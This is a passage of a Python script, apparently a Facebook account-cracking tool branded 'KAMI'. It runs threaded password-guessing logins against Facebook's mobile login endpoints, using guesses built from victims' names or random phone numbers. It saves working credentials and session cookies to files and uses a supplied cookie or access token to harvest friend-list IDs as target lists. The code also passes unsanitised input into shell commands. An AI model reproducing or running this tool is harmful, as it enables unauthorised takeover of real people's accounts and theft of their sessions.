				print('\033[1;33mExample : /sdcard/filename.txt')
				linex()
				file = input('\033[1;37m[+] Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				os.system('clear')
				print(logo)

				print('\033[1;32m[1] Method 1')
				print('\033[1;32m[2] Method 2')
				print('\033[1;32m[2] Method 3')


				linex()
				mthd=input('\033[1;32m[+] Choose : ')
				linex()
				plist = []
				try:
					
				    #linex()
				
					ps_limit = int(input('\033[1;32m[+] How many passwords do you want to add : '))
				except:
					ps_limit =1
				
				linex()
				for i in range(ps_limit):
				
					plist.append(input(f'\033[1;32m[+] Put password {i+1}: '))
				linex()
				print('\033[1;32m[1] Enter For Cloning')
				linex()
				cx=input('\033[1;32m[+] Choose : ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
					
				else:
					pcp.append('n')
				xi()
				with tred(max_workers=90) as crack_submit:
					os.system('clear')
					print(logo)
					total_ids = str(len(fo))
					print('\033[1;37mTotal Account : \033[1;32m'+total_ids)                                     
					print('\033[1;31mUse Flight Mode For Ok Ids')
                                        
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2', '02']:
							crack_submit.submit(mbasic,ids,names,passlist)
						elif mthd in ['3', '3']:
							crack_submit.submit(basic_rnd,ids,names,passlist)

				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python KAMI.py')
			else:
				exit(' Option not found in menu...')

def random_nmb():
	uid=[]
	os.system('clear')
	print(logo)
	print('\033[1;31m[+] EXAMPLE : 92318 : 92345 : 92323 : 92306')
	print('\033[1;37m----------------------------------------------')
	kode = input('[+]\33[1;32m ENTER CODE : ')
	os.system('clear')
	print(logo)
	limit = int(input('\033[1;32m[+] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	xi()
	with ThreadPool(max_workers=65) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print('[+] Total Ids : '+tl)
		print('[+] Choice code : \033[1;92m'+kode)
		print('\033[1;37m----------------------------------------------') 
		print('[+] \033[38;5;204mUse flight mode for speed up\33[1;97m')
		print('\033[1;37m----------------------------------------------') 
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'khankhan','khan1122',]
			yaari.submit(rcrack1,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [KAMI-OK.txt,KAMI-CP.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	menu()


def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            ua = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": '""(Not(A:Brand";v="99"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "macOS",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent":ua,}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m[KAMII-OK] {uid}|{ps}")
                print(f" \ Cookie : {coki}")
                open('/sdcard/KAMI-OK.txt', 'a').write( uid+' | '+ps+'\'')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[KAMI-CP] {cid}|{ps}")
                open('/sdcard/KAMI-CP.txt', 'a').write( uid+' | '+ps+' \'')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\33[1;37m[Crack] %s|\33[1;32mOK:-%s \33[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass

#method 1


def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KAMII-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		
		first = names.split(' ')[0]
		try:
			
			last = names.split(' ')[1]
		except:
			
			last = 'Khan'

		ps = first.lower()
		ps2 = last.lower()
		
		for fikr in passlist:
			
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen2)

			head = {'Host': 'p.facebook.com',
			   'method':'GET',
                           'viewport-width': '980',
                           'sec-ch-ua': '""(Not(A:Brand";v="99""', 
                           'sec-ch-ua-mobile': '?0',
                           'sec-ch-ua-platform':'"macOS"', 
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent':ua,
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
                           'sec-fetch-site': 'none',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			kami=session.cookies.get_dict().keys()
			if "c_user" in kami:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [KAMII-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in kami:
				if 'y' in pcp:
					# print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1

	
# method 2 from opera browser

def mbasic(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KAMII-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		
		first = names.split(' ')[0]
		try:
			
			last = names.split(' ')[1]
		except:
			
			last = 'Khan'

		ps = first.lower()
		ps2 = last.lower()
		
		for fikr in passlist:
			
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen3)
			
			head = {'Host': 'mbasic.facebook.com',
                                'method': 'GET',
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9',
                                'cache-control': 'max-age=0',
                                'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Microsoft Edge";v="106"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"macOS"',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin',
                                'sec-fetch-user': '?1',
                                'upgrade-insecure-requests': '1',
                                'user-agent':ua,}
			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			kami=session.cookies.get_dict().keys()
			if "c_user" in kami:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m[KAMII-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in kami:
				if 'y' in pcp:
					# print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1


# method 03 use radom user agents

def basic_rnd(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[KAMII-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		
		first = names.split(' ')[0]
		try:
			
			last = names.split(' ')[1]
		except:
			
			last = 'Khan'

		ps = first.lower()
		ps2 = last.lower()
		
		for fikr in passlist:
			
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen2)
			
			head = {'Host': 'mbasic.facebook.com',
                                'method': 'GET',
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'accept-encoding': 'gzip, deflate, br',
                                'accept-language': 'en-US,en;q=0.9',
                                'cache-control': 'max-age=0',
                                'sec-ch-ua': '"(Not(A:Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"macOS"',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'none',
                                'sec-fetch-user': '?1',
                                'upgrade-insecure-requests': '1',
                                'user-agent':ua,}
			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"',
            str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 
            str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			kami=session.cookies.get_dict().keys()
			if "c_user" in kami:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m[KAMII-OK] %s | %s'%(ids,pas))
				open('/sdcard/KAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in kami:
				if 'y' in pcp:
					# print('\r\r\33[1;33m[KAMII-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/KAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1


#  login menu
def login():
        os.system('clear')
        print(logo);xchker()
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python KAMII.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                menu()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                menu()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()


#  making file menu

def create_file():
        os.system('clear')
        print(logo);xchker()
        print('\033[1;32m[1] Create File ')
        print('\033[1;32m[0] Back')
        print('\033[1;37m----------------------------------------------')
        create_ = input('\033[1;32mSelect : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "0":
                menu()
        else:
                exit('invalid select')

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo);xchker()
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['id']
                name = load['name']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo);xchker()
        print("\033[1;32m[1] Create File Mix Ids")
        print("\033[1;32m[2] Create File New Ids")
        print('\033[1;37m----------------------------------------------')
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f'[*] Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;33m /sdcard/filename.txt \033[0;97m\n')
        #100010138361148
        sf = input('\032[1;32m Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print('\032[1;32m Total ids To Dump: '+str(len(file)))
        print('\033[1;32m Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(file_ex,exid,cookies,access_token,sf)
        print('\033[1;31m Total ids Extracted : '+str(len(total)))
        input('\033[1;31m Press enter to back ')
        menu()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f'[*] Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;31mExample: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n\033[1;32mHow Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;33m/sdcard/filename.txt \033[0;97m\n')
        #100010138361148
        sf = input('\033[1;32mSave File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print('\033[1;32mTotal ids To Dump: '+str(len(file)))
        print('\033[1;32mDumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(file_ex, exid,cookies,access_token,sf)
        try:
                son = f"kami{str(random.randint(0,90))}.txt"
        except:
                son = f"kami{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print('\033[1;32m Total ids Extracted : '+str(len(total)))
        print('\033[1;32m New ids Saved As : /sdcard/'+son)
        print('\033[1;32m Normal ids Saved As : '+sf)
        input('\033[1;32m Press enter to back ')
        menu()

def file_ex(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sprate():
        xchker()
        os.system('clear');print(logo);xchker()
        try:
                limit = int(input('\032[1;32m How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'\032[1;33mFile Path Example /sdcard/filename.txt')
        print('\033[1;37m----------------------------------------------')
        file_name = input('\\032[1;32m Input file path : ')
        print('\033[1;37m----------------------------------------------')
        print(f'\032[1;33mSave As Example /sdcard/newfile.txt')
        print('033\1;37m----------------------------------------------')
        new_save = input('\\032[1;32m Save new file as : ')
        print('\033[1;37m----------------------------------------------')
        y = 0
        print(f"\032[1;31mIds To Grabb Ex [ 100087,10000,10006 etc ]")
        print('\033[1;37m----------------------------------------------')
        for k in range(limit):
                y+=1
                links=input('\032[1;33m Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m-")
        print(f'\032[1;32mids grabbed successfully')
        print('\032[1;32mTotal grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\032[1;32mNew file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m-")
        input('\032[1;32m[Press enter to back] ')
        menu()

def double():
        os.system('clear')
        print(logo);xchker()
        user_file = input('File Path : ')
        print('\033[1;37m----------------------------------------------')
        try:
                open(user_file,'r').read()
                print('\n\033[1;33mExample: /sdcard/filename.txt')
                print('\033[1;37m----------------------------------------------')
                save_file = input('Save new file as: ')
                print('\033[1;37m----------------------------------------------')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print('\033[1;37m----------------------------------------------')
                print('\033[1;32m Fully Removed Multi Lines Ids')
                print('\033[1;37m----------------------------------------------')
                print('\033[1;32m Dublicate Lines Removed From File')
                print('\033[1;32m File Saved As : '+save_file)
                print('\033[1;37m----------------------------------------------')
                input('\033[1;32mPress enter to back ')
                menu()
        except FileNotFoundError:
                print(' Invalid File ')



if __name__=='__main__':
	print('Checking Update')
	os.system("git pull")
	aprv()